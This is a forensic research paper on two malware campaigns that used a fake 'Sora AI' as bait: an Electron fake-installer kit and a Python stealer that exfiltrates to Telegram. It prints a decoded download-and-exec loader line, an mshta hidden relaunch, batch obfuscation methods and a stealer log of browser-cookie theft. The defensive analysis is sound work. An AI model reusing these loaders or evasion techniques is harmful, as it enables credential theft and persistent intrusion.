# Two Waves, One Brand: Forensic Analysis of a Double "Sora AI" Malvertising Infection on a Windows Workstation

**Technical case study — v0.2 — Zenodo DOI: 10.5281/zenodo.23170945**

Author: Fabio Ghioni — ORCID: [0009-0009-0415-9434](https://orcid.org/0009-0009-0415-9434)
Analysis date: 3 October 2026
Proposed license: CC BY 4.0

> **Ethics notice.** All victim identifiers have been removed and replaced with placeholders (`[username]`, `[machine name]`, `[victim public IP]`). The Telegram bot token is partially redacted; network IoCs are defanged by convention (`hxxp://`, `domain[.]com`). No executable samples are included in this publication.

---

## Abstract

We present the post-mortem forensic analysis of a Windows 10/11 workstation hit by **two distinct malvertising campaigns** abusing the "Sora" brand (OpenAI's video generator) as bait, five weeks apart (December 2024 – January 2025). The first campaign distributed a **fake Electron desktop application** ("SoraAI 1.0.6") that turned out to be a **commercial fake-installer generation kit** with an affiliate model, an obfuscated JavaScript loader, a Google Calendar dead drop, and a native Rust module capable of running EXE payloads entirely in memory. The second campaign distributed a **Python infostealer** matching the Braodo Stealer pattern, with Run-key persistence, exfiltration to the Telegram API, and specific targeting of Facebook advertising accounts. For the second infection we recovered the **debug log left behind by the malware itself**, documenting the confirmed theft of 19 passwords, 504 session cookies, and one credit card. We also document **confirmed monetization**: the workstation's Facebook ad account was used to spread the same malvertising, proving that the campaign self-funds through infected machines. This case is relevant for three reasons: (1) the Electron kit was recovered **with the author's entire development environment**, including affiliate ID, infrastructure, and build-machine paths; (2) both attack chains evaded the host's antivirus defenses for months (persistence survived **21 months**, until manual remediation); (3) we document, from the victim side, the life cycle of a stealer "orphaned" by its C2. We release IoCs, YARA rules, and methodology for reproducibility.

**Keywords:** malvertising, infostealer, Braodo Stealer, Electron, malware-as-a-service, fileless execution, Telegram C2, digital forensics, fake AI apps

---

## 1. Introduction

The media success of AI-based video generators has created fertile ground for malvertising campaigns impersonating well-known brands. Between December 2024 and January 2025, the analyzed workstation was infected twice by fake "Sora AI" software, both promoted through sponsored ads on social networks. The two attacks are **independent of each other** (different infrastructure, toolchains, and authors) but share the same thematic bait, offering a rare opportunity to compare two branches of cybercrime-as-a-service:

- **Campaign A (December 2024):** fake "SoraAI" desktop installer — an Electron/Nuxt kit with an affiliate economy (pay-per-install), fileless execution via a Rust module.
- **Campaign B (January 2025):** a fake `.mp4` video (actually a `.com` executable) installing a Python infostealer of the Braodo family/pattern, focused on stealing Facebook advertising accounts.

The full analysis and final remediation were performed on 3 October 2026. However, campaign B's infection event had been detected as early as January 2025 (§4.4.1): after immediate mitigation of the exposure, the loader's persistence was **deliberately kept active under observation** to study its behavior after its infrastructure died. It was still active in October 2026.

### 1.1 Contributions

1. Complete documentation, with primary evidence, of a **fake "AI installer" MaaS kit** recovered with sources, configuration (`.env`), affiliate ID, and build-machine paths.
2. Multi-layer static analysis of the `9a.bat` persistence script, including obfuscation techniques so far poorly documented in the combined form observed (fake UTF-16 BOM, runtime command assembly via environment-variable substrings, arithmetic dead code).
3. Victim-side observation of a **Braodo-like exfiltration to Telegram**, with the malware's own debug log confirming timing, contents, and channel of the theft.
4. Empirical evidence of the **prolonged failure of signature-based AV defense** against low-noise threats, with discussion of the implications.

---

## 2. Methodology

The analysis was performed on the live machine, after creating copies of all evidence with SHA256 hashing at acquisition time. Sources used:

| Source | Use |
|---|---|
| Chrome/Edge history and downloads | Reconstruction of initial vectors (URLs, referrers, ad parameters) |
| **SRUDB.dat** database (System Resource Usage Monitor, ~68 MB, preserved) | Process execution timeline |
| Windows **Shell-Core** log (event 9707) | Confirmation of per-logon persistence executions |
| Registry (HKCU Run, uninstall) | Persistence and uninstall entries, with **.reg backup before removal** |
| File system metadata (creation/modification timestamps) | Installation sequence reconstruction |
| Static analysis | `app.asar` (Electron), `9a.bat` (obfuscated batch), `lib.rs`/`Cargo.toml` (Rust module) |
| Malware residual logs | `main.log` (SoraAI app), stealer debug log |

All hashes of relevant files are listed in Appendix B. Removals were performed only after backing up the affected registry keys and moving (not deleting) the incriminated folders.

---

## 3. Campaign A — the fake "SoraAI" app (December 2024)

### 3.1 Initial vector

- **11/12/2024 02:57:02** — download of `InstallSoraAI.exe` (122,959,664 bytes) from `hxxps://openai-index-sora-video[.]com/`, served via `hxxps://appliedaibusiness[.]com/api/p_b?uuid=tl4fA1JcPR&icon=sora&name=InstallSoraAI.exe`.
- An earlier installation had already occurred at **00:15:03** (app data folder creation); the app was launched **3 times** (00:15:06, 00:24:40, 02:59:44; source: `main.log`).
- Installed to `C:\Users\[username]\AppData\Local\Programs\sora\`, with an **unsigned** `SoraAI.exe` ("Company: OpenAiLLC", compiled 09/12/2024 15:03), uninstall entry, and Start Menu shortcut.

### 3.2 Operation

The application is an **Electron/Nuxt** package. On launch it shows a fake "Install" window; on user click, the IPC handler `invoke-start-install` calls `jumpUp()` (module `outMutation.js`), which runs a base64-obfuscated JavaScript loader. **Microsoft Defender classifies the loader as `Trojan:JS/GlassWorm.HAF!MTB` (severity 5)** — a detection that occurred only during analysis, not at infection time.

The observed chain:

1. The loader retrieves the payload URL from a **Google Calendar event used as a dead drop** (`hxxps://calendar.app.google/Cib52LrMMujMewsE9`): a *dead drop resolver* technique abusing Google's legitimate, trusted infrastructure so the payload URL can be swapped at will and resist takedown.
2. Downloads an encrypted script (HTTP headers `ivbase64` and `secretkey`) and decrypts it.
3. A **native Rust module** (Neon bindings, `memexec` 0.2 crate) **executes the EXE directly in memory** (`memexec::memexec_exe(&data)`), never writing it to disk: fileless execution that neutralizes AV on-write scanning.
4. An anti-analysis function (`checkProcess.js`) terminates the app if it detects any of **42 analysis tools** (Wireshark, Process Hacker, x64dbg, IDA, OllyDbg, procmon, VMware/VirtualBox/Xen/QEMU guest tools, etc.).

### 3.3 The kit: a full development environment left in the package

The most valuable element for research: the `app.asar` contains **the author's entire development environment**, not just production code:

- **Plaintext `.env`** with the campaign configuration:
  - `HOST=hxxp://82.197.67[.]174` — payload server (Contabo GmbH, Germany);
  - `REDIS=redis://45.93.20[.]174:6379` — tracking server (UFO Technologies Ltd, UK);
  - `PARTENER_ID=6PHM9GG3zOACOOY` — **affiliate ID**: the kit operates on a commission model (pay-per-install); distributors are paid per installation;
  - `OFFER=sora` — the current "campaign".
- **Payload link:** `hxxp://82.197.67[.]174/13NVrZ4CkIbW3Ije19dJKw==` (with a per-affiliate base64 counterpart in `link.txt`).
- **Post-install page:** `hxxps://replicate-6phm9gg3zoacooy.app-tools[.]info/explore` — the subdomain embeds the lowercase affiliate ID.
- **`readme.txt` with developer instructions** and the author's machine path: `M:\electron\electron\load.js`.
- **Rust module `Cargo.toml`**, depending on `memexec`, `cryptify` (string obfuscation), `neon`, with a release profile optimized for "cryptablity" [sic].
- **Icon set for dozens of brands to impersonate**: Sora, Haiper, Leonardo AI, MidJourney, Ideogram, Runway, PicsArt, Akool, Uizard, Slidesgo, Postman, Chrome, Opera, Mozilla, Meta. The kit is a **multi-campaign fake-installer generator**: changing the bait only requires changing `OFFER` and an icon.

### 3.4 Attribution

A Russian-language comment in `helper.js` (copied from the Russian MDN documentation) is weak evidence of a Russian-speaking developer; the affiliate economic model is consistent with the Russophone PPI ecosystem. **No strong attribution is possible.** No traces of the final payload or persistence were found: whether the in-memory payload actually executed is undeterminable.

---

## 4. Campaign B — "Braodo-like" Python infostealer (January 2025)

### 4.1 Initial vector

- **16/01/2025 03:24:21** — Chrome downloads `C:\Users\[username]\Videos\video_for_you.mp4 - openai.com` (119,849,552 bytes). The real extension is **`.com`**, a Windows executable disguised as a video (double extension + spaces, T1036).
- Origin page: `hxxps://aisoraplus[.]com/`, reached from a **sponsored Facebook/Instagram ad** (the `fbclid` parameter contains the `aem` and `adid` fields typical of ad clicks).
- File hosted on **Dropbox**: `hxxps://www.dropbox[.]com/scl/fi/p4qqb4itbnnzyaaiaonz4/video_for_you.mp4-openai.com?rlkey=...`

### 4.2 Installation and persistence

- **03:26:00** — creation of `C:\Users\Public\Downloads\xmetavip2\`: a **portable Python 3.10 runtime** with `pythonw.exe` renamed to `pw.exe` and libraries `Crypto`, `requests`, `websocket`, `pywin32`.
- **03:26:04** — first execution.
- Persistence: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, value **`WindowsSecurity`** (a name chosen to blend among legitimate entries) → `C:\Users\Public\Downloads\xmetavip2\9a.bat`.
- The Shell-Core log (event 9707) confirms execution **at every user logon**, the last on **02/10/2026 18:25** — 21 months of active persistence.

### 4.3 Analysis of `9a.bat` (94,437 bytes)

The script is protected by **at least five layers of obfuscation**, documented here for the first time in this combination:

1. **Fake UTF-16 BOM** (`FF FE`) prepended to what is actually an ANSI file: editors and parsers decode the content as UTF-16, producing unreadable CJK noise, while `cmd.exe` executes it correctly.
2. **Junk environment variables**: every character of the real commands is interleaved with undefined `%JunkName%` tokens (expanded to empty strings by cmd), including names containing symbols (`%ws)uP%`, `%(Zbx#AU%`) that break naive deobfuscation regexes.
3. **Label-and-goto maze**: ~100 numeric labels (`:615066`, `:630912`, …) with `goto` statements pointing to apparently nonexistent labels (`;,;`, `,`), enabled by non-linear flow logic.
4. **Arithmetic dead code**: dozens of effect-free `set /a ans=<hex/octal expression>` instructions that raise statistical entropy and fatigue manual analysis.
5. **Runtime assembly of the final command**: the payload never exists in plaintext in the file. Characters are extracted at runtime via substrings of environment variables present on every Windows install (`%DRIVERDATA:~-34,1%`, `%PROGRAMFILES(X86):~-17,1%`, `%LOCALAPPDATA:~-12,1%`) and from a custom charset string (`KDOT=PS7sU4zhlIiMLyRCncv3tKbZXEfx5pjrOVmA1BgH9GNk2J0Y8FWd6QqDuoTaew`).

The decoded behavior (confirmed by static analysis):

1. **Hidden self-relaunch** via `mshta vbscript:CreateObject("WScript.Shell").Run(...,0)` (line located verbatim in the file).
2. **Stealer execution** via the portable runtime:
   `pw.exe -c "import base64;exec(base64.b64decode('...'))"`
   which reduces to:
   `exec(base64.b64decode(urllib.request.urlopen('hxxps://raw.githubusercontent[.]com/hacker9xclone/111/refs/heads/master/mrxw').read()))`
   — the stealer code is **downloaded from GitHub and executed in memory** at every startup: the on-disk script is only a 4-logical-line loader, which explains its multi-year invisibility to AV signatures.

### 4.4 Exfiltration and stolen data (confirmed theft)

The malware left its own **debug log** on the machine, detailing the activity of 16/01/2025:

- **03:26:07–03:26:13** — connection to the **browser remote debugging port** (`localhost:9222`, a cookie-extraction technique bypassing Chrome/Edge encryption), requests to `adsmanager.facebook.com`, `business.facebook.com`, and **Graph API v17.0** (`me/adaccounts`, `me?fields=businesses`, `me/facebook_pages` with fan_count/verification_status, `me/groups` with admin/member_count) to profile the victim's Facebook advertising assets. In this case all Graph calls fail (`access_token=False`): no Facebook token found.
- **03:26:13** — IP geolocation via `ip-api[.]com`; compression of the collected folder (`All_Passwords.txt`, `Facebook_Cookies.txt`, `Cookies Browser\Edge_Default.txt`) into `[IT_[victim public IP]] [machine name].zip`. Log messages are **in Vietnamese**.
- **03:26:14** — upload via **Telegram Bot API**:
  - Bot ID `7692901771` (token partially redacted in this publication);
  - destination chat `-1002407933384` (supergroup/channel);
  - `sendDocument` method with `protect_content=True` (prevents forwarding in the Telegram client — an operational precaution by the attacker);
  - caption: `IP: [victim public IP] / Country: IT - Italy / User: [username] / Browser Data: CK: 504 | PW: 19 | CC: 1`.

**Confirmed loot: 19 passwords saved in browsers, 504 session cookies, 1 credit card, public IP/country/username/machine name.** Session-cookie theft is especially severe: it enables *session hijacking* even on accounts protected by 2FA.

### 4.4.1 Confirmed monetization: the malvertising loop

In the days following the exfiltration, the professional Facebook account associated with the workstation showed unauthorized activity: an **active advertising campaign promoting a Vietnamese product** and the addition of a **Vietnamese collaborator** to the ad account. A technically relevant detail: access was gained **without any Graph API token** — the stealer's attempts failed with `access_token=False` (§4.4) — but the stolen **session cookies** (T1539) were sufficient to operate on the account. Immediate mitigation: ad account closed, collaborator removed, critical credentials rotated. The payment card associated with the account was expired by the user's policy, making direct monetization at the owner's expense impossible.

The episode confirms the campaign's economic model: **the ads spreading the malware are paid for with the ad accounts of infected machines** — the campaign self-funds through its own victims, while the advertising platform collects revenue at every turn of the cycle. It also converges with the attribution to Vietnamese actors (§4.5).

### 4.5 Attribution

The pattern matches **Braodo Stealer**, documented by Splunk and attributed to Vietnamese actors: same targeting of Facebook advertising accounts, payload hosting on GitHub, Telegram exfiltration, Vietnamese log messages. The GitHub account `hacker9xclone` had been active since at least 2020 (a fork of a C++ keylogger in October 2020; the `111` repository later used to host the payload was empty in December 2020). **At analysis time the account has been removed** (HTTP 404) and the `mrxw` payload is no longer retrievable from GitHub or the Wayback Machine.

### 4.6 An "orphaned" stealer: 21 months of empty executions

After the exposure was mitigated (§4.4.1), persistence was deliberately kept active under observation: the goal was to document the behavior of a stealer "orphaned" by its C2. The malware's counter file reads `1` and the log was never updated after 16/01/2025. Most likely the full theft happened **only once**; subsequent per-logon executions (until 02/10/2026) silently failed after the GitHub account hosting the payload was removed. This cannot be proven with 100% certainty: a window in which the payload was reachable again cannot be excluded. The case illustrates an under-documented aspect: a loader's persistence remains active **years after its infrastructure dies**, continuing to pose a risk (C2 reactivation, or dismissal as a "benign" false negative by signature scanners).

---

## 5. Indicators of Compromise (selection)

Full list in `iocs.csv` in the accompanying repository. All defanged.

**Network**
- `openai-index-sora-video[.]com`, `appliedaibusiness[.]com`, `aisoraplus[.]com`, `app-tools[.]info`
- `82.197.67[.]174` (payload server, Contabo), `45.93.20[.]174:6379` (Redis tracking)
- `calendar.app.google/Cib52LrMMujMewsE9` (dead drop)
- `raw.githubusercontent[.]com/hacker9xclone/111/refs/heads/master/mrxw`
- Telegram bot `7692901771`, chat `-1002407933384`

**Host**
- `%PUBLIC%\Downloads\xmetavip2\` (portable Python runtime, `pw.exe`)
- `%LOCALAPPDATA%\Programs\sora\`, `%APPDATA%\sora`, `%LOCALAPPDATA%\sora-updater`
- `HKCU\...\Run\WindowsSecurity` → `9a.bat`
- Masquerading file: `video_for_you.mp4 - openai.com` (double extension)

**SHA256 hashes** (main)
- `9a.bat`: `197F763BCD619F96E8C8C9074C9F483CCDB31E49B6E51C115D086A48BED17DE0`
- `pw.exe` (legitimate PSF-signed pythonw.exe): `FF507B25AF4B3E43BE7E351EC12B483FE46BDBC5656BAAE6AD0490C20B56E730`
- `SoraAI.exe`: `9777AC1267C9EE6EBC57468DD25F1714F9120583A875164DD015C030D5DEBBF6`
- `app.asar`: `5BD2DDD90BB5451BA1CA6662E8F45B2A89DE5F9287CC4F4B5E8E9A68B00A90C6`
- `node.exe` downloaded by the malware (legitimate Node.js 22.9.0 x86): `317AEAFE7DFEB5093534FE0BE6DE946C302BB39C40BA8DE47BC51A8B305AFAD3`

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | Campaign | Evidence |
|---|---|---|---|
| Initial Access | T1189 Drive-by Compromise | A, B | social malvertising |
| Execution | T1059.007 JavaScript | A | obfuscated JS loader |
| Execution | T1059.003 Windows Command Shell | B | 9a.bat |
| Execution | T1059.006 Python | B | pw.exe -c |
| Execution | T1218.005 Mshta | B | hidden relaunch via mshta/vbscript |
| Persistence | T1547.001 Registry Run Keys | B | Run\WindowsSecurity |
| Defense Evasion | T1620 Reflective Code Loading | A | memexec (in-memory EXE) |
| Defense Evasion | T1036.007 Double File Extension | B | `.mp4 - openai.com` |
| Defense Evasion | T1027 Obfuscation | A, B | base64 loader; 5-layer 9a.bat |
| Defense Evasion | T1027.013 Encrypted/Encoded File | A | payload with ivbase64/secretkey |
| Defense Evasion | T1497.001 System Checks | A | checkProcess anti-analysis (42 tools) |
| Defense Evasion | T1218 System Binary Proxy Execution | B | pw.exe = renamed legitimate pythonw.exe |
| Credential Access | T1555.003 Credentials from Web Browsers | B | 19 passwords |
| Credential Access | T1539 Steal Web Session Cookie | B | 504 cookies via debug port 9222 |
| Collection | T1005 Data from Local System | B | collection and zip compression |
| C2 | T1102.002 Bidirectional Communication | A, B | Google Calendar, GitHub as dead drop/hosting |
| C2 | T1071.001 Web Protocols | B | Telegram Bot API |
| Exfiltration | T1567.002 Exfiltration to Cloud Storage | B | sendDocument to Telegram chat |
| Exfiltration | T1041 Exfiltration Over C2 Channel | B | HTTPS to api.telegram.org |

---

## 7. Discussion: why the antivirus saw nothing for 21 months

Both attack chains share a structural property: **every on-disk component is, taken individually, benign or nearly so.**

- Campaign A: a legitimate-looking Electron app whose only hostile behavior is decoded and executed in memory; the malicious EXE never touches the file system (memexec); the payload URL is hidden behind a trusted service (Google Calendar).
- Campaign B: a Python interpreter signed by the Python Software Foundation, renamed; a `.bat` script whose hostile content never exists in static form (assembled at runtime); the stealer code hosted on GitHub, a trusted domain, executed in memory.

Signature scanning operates on at-rest file content: here **there is almost nothing at rest**. Defender's detection (`GlassWorm.HAF!MTB`) of campaign A's JS loader only happened because signatures were updated **afterwards** — and even then it produced neither quarantine nor removal of campaign B's persistence, which survived another 21 months until human-driven manual remediation.

The countermeasures that would have intercepted the attack are of a different nature: **behavioral EDR** (parent-child relationship `mshta → cmd → pw.exe`, access to the browser debug port), **application control** (WDAC/AppLocker on `%PUBLIC%`), **TLS inspection with domain threat intel** (raw.githubusercontent to freshly created repos, Dropbox for executables), and above all **usage hygiene**: no free desktop "AI" software downloaded from social ads.

---

## 8. Remediation and recommendations (operational summary)

Actions of 03/10/2026: backup and removal of the `WindowsSecurity` Run value; quarantine (Recycle Bin) of `xmetavip2`, the `sora` folders, and the uninstall entry; negative verification of other persistence mechanisms (scheduled tasks, services, WMI, IFEO, Winlogon, hosts, proxy).

Applied post-incident recommendations: blocking the credit card saved in the browser; changing all passwords from a clean device; **"Sign out of all devices" on every service** (stolen cookies bypass 2FA); revocation and regeneration of API tokens/keys; Microsoft Defender Offline scan. Abuse reports: Telegram (bot 7692901771), Contabo, Dropbox, Google (Calendar), Meta (ad).

---

## 9. Limitations

- Campaign A's final payload was not recovered: whether and what executed in memory on 11/12/2024 is unknown.
- Campaign B's `mrxw` payload is no longer available (GitHub account removed): the stealer analysis relies on its log and observed behavior, not the full code.
- Additional exfiltration windows after 16/01/2025 cannot be excluded, although the evidence (counter=1, log never updated) makes it unlikely.
- Campaign A attribution: weak clues only.

---

## 10. Material availability

- GitHub repository (IoCs, YARA, deobfuscation analysis, documentation): https://github.com/anckhalion/security-research/tree/main/cases/001-sora-ai-malvertising
- `9a.bat` sample: shared with the research community via **MalwareBazaar (abuse.ch)**, identified by SHA256 `197F763BCD619F96E8C8C9074C9F483CCDB31E49B6E51C115D086A48BED17DE0`; the uploaded archive is also indexed under SHA256 `419F513BE822E01EBC1494AC1C20D78DE701EAEAE5FA025625550EE518C41A5F` (password-protected zip, `infected` convention).
- Other sensitive evidence (SRUDB.dat, full log with token): **not published**; available to accredited researchers upon motivated request.
- This paper is deposited on Zenodo with DOI: [10.5281/zenodo.23170945](https://doi.org/10.5281/zenodo.23170945)

## Appendix A — Consolidated timeline

| Date/time | Event |
|---|---|
| 11/12/2024 00:15:03 | First fake SoraAI app installation |
| 11/12/2024 00:15:06 / 00:24:40 / 02:59:44 | Three app launches |
| 11/12/2024 02:57:02 | `InstallSoraAI.exe` download |
| 16/01/2025 03:24:21 | Fake `.mp4` download from Facebook/Instagram ad |
| 16/01/2025 03:26:00 | `xmetavip2` runtime creation |
| 16/01/2025 03:26:14 | **Confirmed Telegram exfiltration** |
| January 2025 (following days) | Anomaly detected on Facebook Ads: active Vietnamese campaign, collaborator removed, ad account closed, critical credentials rotated |
| 16/01/2025 → 02/10/2026 | Persistence kept active **under observation**, per-logon execution |
| 03/10/2026 | Analysis and remediation; evidence preservation |

## Appendix B — Full hashes

See `hash_sha256.csv` in the accompanying corpus (campaigns A and B, including `python310.dll`, `Uninstall SoraAI.exe`, `elevate.exe`, `node.exe`).

## Appendix C — Stealer log excerpt (redacted)

```
2025-01-16 03:26:07 - DEBUG - Starting new HTTP connection (1): localhost:9222
2025-01-16 03:26:13 - INFO  - Đang thêm: C:\Users\[username]\...\All_Passwords.txt
2025-01-16 03:26:13 - INFO  - Thư mục ... đã được nén thành ...\[IT_[victim public IP]] [machine name].zip
2025-01-16 03:26:14 - DEBUG - api.telegram.org "POST /bot7692901771:[TOKEN REDACTED]/sendDocument
    ?chat_id=-1002407933384&caption=IP: [victim public IP] Country: IT - Italy
    User: [username] Browser Data: CK: 504|PW: 19|CC: 1 &protect_content=True" 200
```
